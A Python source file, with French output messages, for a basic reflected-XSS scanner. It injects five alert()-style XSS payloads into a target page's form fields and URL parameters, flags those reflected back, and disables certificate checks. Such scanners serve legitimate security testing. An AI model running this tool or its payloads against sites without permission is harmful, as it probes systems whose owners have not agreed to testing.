import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
import time

class XSSScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
        ]
        
        self.vulnerabilities = []
    
    def get_forms(self, url):
        try:
            print(f"[*] Connexion à: {url}")
            response = self.session.get(url, timeout=self.timeout, verify=False)
            print(f"[+] Statut: {response.status_code}")
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')
            return forms
        except requests.exceptions.ConnectionError:
            print(f"[!] Impossible de se connecter à {url}")
            print("[!] Vérifiez votre connexion internet ou l'URL")
            return []
        except requests.exceptions.Timeout:
            print(f"[!] Délai d'attente dépassé pour {url}")
            return []
        except Exception as e:
            print(f"[!] Erreur: {e}")
            return []
    
    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            if input_name:
                inputs.append({
                    "type": input_type,
                    "name": input_name,
                    "value": input_tag.attrs.get("value", "")
                })
        
        for textarea in form.find_all("textarea"):
            textarea_name = textarea.attrs.get("name")
            if textarea_name:
                inputs.append({
                    "type": "textarea",
                    "name": textarea_name,
                    "value": textarea.get_text()
                })
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    
    def test_xss_in_form(self, form, url):
        form_details = self.get_form_details(form)
        
        if not form_details["inputs"]:
            print("    [!] Aucun input trouvé dans ce formulaire")
            return False
        
        print(f"    [*] Méthode: {form_details['method'].upper()}")
        print(f"    [*] Action: {form_details['action']}")
        print(f"    [*] Inputs: {len(form_details['inputs'])}")
        
        for payload in self.payloads:
            data = {}
            for input_field in form_details["inputs"]:
                if input_field["type"] in ["text", "search", "email", "textarea"]:
                    data[input_field["name"]] = payload
                else:
                    data[input_field["name"]] = input_field["value"]
            
            if not data:
                continue
            
            target_url = urljoin(url, form_details["action"])
            
            try:
                if form_details["method"] == "post":
                    response = self.session.post(target_url, data=data, timeout=self.timeout, verify=False)
                else:
                    response = self.session.get(target_url, params=data, timeout=self.timeout, verify=False)
                
                if payload in response.text:
                    vuln = {
                        'url': target_url,
                        'method': form_details['method'].upper(),
                        'payload': payload,
                        'type': 'Form XSS'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"\n    [+++] VULNÉRABILITÉ TROUVÉE!")
                    print(f"    [+++] URL: {target_url}")
                    print(f"    [+++] Payload: {payload}\n")
                    return True
                    
            except Exception as e:
                print(f"    [!] Erreur test: {e}")
        
        return False
    
    def test_xss_in_url(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("[*] Aucun paramètre URL à tester")
            return False
        
        print(f"[*] Test des paramètres URL: {list(params.keys())}")
        
        for param in params.keys():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if payload in response.text:
                        vuln = {
                            'url': test_url,
                            'method': 'GET',
                            'payload': payload,
                            'parameter': param,
                            'type': 'URL XSS'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"\n[+++] VULNÉRABILITÉ URL TROUVÉE!")
                        print(f"[+++] Paramètre: {param}")
                        print(f"[+++] Payload: {payload}\n")
                        return True
                        
                except Exception as e:
                    print(f"[!] Erreur: {e}")
        
        return False
    
    def scan(self):
        print(f"\n{'='*60}")
        print(f"SCAN DE: {self.target_url}")
        print(f"{'='*60}\n")
        
        forms = self.get_forms(self.target_url)
        print(f"\n[*] {len(forms)} formulaire(s) trouvé(s)")
        
        if forms:
            print(f"\n{'='*60}")
            print("TEST DES FORMULAIRES")
            print(f"{'='*60}\n")
            
            for i, form in enumerate(forms, 1):
                print(f"[*] Formulaire #{i}:")
                self.test_xss_in_form(form, self.target_url)
                time.sleep(0.5)
        
        print(f"\n{'='*60}")
        print("TEST DES PARAMÈTRES URL")
        print(f"{'='*60}\n")
        self.test_xss_in_url(self.target_url)
        
        print(f"\n{'='*60}")
        print(f"RÉSULTATS: {len(self.vulnerabilities)} vulnérabilité(s)")
        print(f"{'='*60}\n")
        
        return self.vulnerabilities
    
    def generate_report(self):
        if not self.vulnerabilities:
            print(" Aucune vulnérabilité XSS trouvée\n")
            return
        
        print(f"\n{'='*60}")
        print("RAPPORT DES VULNÉRABILITÉS")
        print(f"{'='*60}\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"Vulnérabilité #{i}:")
            print(f"  Type: {vuln['type']}")
            print(f"  URL: {vuln['url']}")
            print(f"  Méthode: {vuln['method']}")
            print(f"  Payload: {vuln['payload']}")
            if 'parameter' in vuln:
                print(f"  Paramètre: {vuln['parameter']}")
            print()


# PROGRAMME PRINCIPAL
if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    print("\n" + "="*60)
    print("       XSS SCANNER   ")
    print("="*60)
    print("\n  Sites de test recommandés:")
    print("  • http://testphp.vulnweb.com")
    print("  • http://testphp.vulnweb.com/search.php?test=query")
    print("  • https://xss-game.appspot.com/level1/frame")
    print("\n" + "="*60 + "\n")
    
    # DEMANDER L'URL
    target = input("Entrez l'URL complète (avec http:// ou https://): ").strip()
    
    if not target:
        print("\n Erreur: Vous devez entrer une URL!\n")
        exit()
    
    if not target.startswith(('http://', 'https://')):
        print("\n  Erreur: L'URL doit commencer par http:// ou https://")
        print("Exemple: http://testphp.vulnweb.com\n")
        exit()
    
    # DÉMARRER LE SCAN
    try:
        scanner = XSSScanner(target)
        scanner.scan()
        scanner.generate_report()
        
    except KeyboardInterrupt:
        print("\n Scan interrompu\n")
    except Exception as e:
        print(f"\n Erreur fatale: {e}\n")
    
    print("="*60)
    print("Scan terminé!")
    print("="*60 + "\n")